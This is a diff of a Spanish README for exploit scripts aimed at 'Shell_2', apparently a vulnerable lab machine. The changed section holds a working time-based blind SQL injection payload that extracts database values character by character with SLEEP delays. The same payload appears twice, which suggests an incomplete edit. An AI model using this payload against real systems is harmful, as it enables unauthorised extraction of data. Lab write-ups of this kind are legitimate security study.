@@ -3,18 +3,21 @@ Este repositorio contiene scripts utilizados para `Shell_2`, una máquina con vu
 
 ## Consideraciones de la máquina
 
-    El host `192.168.44.134` no está editado en los scripts, la VM se utilizó con configuración NAT
-    Uso de encabezado `X-Forwarded-For`
+    - El host `192.168.44.134` no está editado en los scripts, la VM se utilizó con configuración NAT
+    - Uso de encabezado `X-Forwarded-For`
     
 
 ## Impacto vulnerabilidad SQLi
 
 ### Procedimiento:
-
+Partiendo de la base en la que podemos validar una inyección exitosa con
 ```SQL
   1' OR IF((SELECT SUBSTRING($column,$position,1) FROM $db_name.$table_name LIMIT $row_index,1)='$char', SLEEP(0.043), 0) #
 ```
-
+Procedimos a 
+```SQL
+  1' OR IF((SELECT SUBSTRING($column,$position,1) FROM $db_name.$table_name LIMIT $row_index,1)='$char', SLEEP(0.043), 0) #
+```
     
 ## Disclaimer
 
